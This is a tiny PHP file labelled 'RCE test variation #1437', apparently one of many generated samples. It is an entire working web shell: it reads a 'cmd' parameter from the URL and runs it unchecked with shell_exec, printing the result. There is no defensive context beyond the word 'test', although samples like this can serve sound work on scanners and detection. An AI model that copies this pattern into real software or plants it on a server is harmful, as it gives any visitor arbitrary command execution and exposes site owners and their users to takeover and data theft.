<?php
// RCE test variation #1437
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>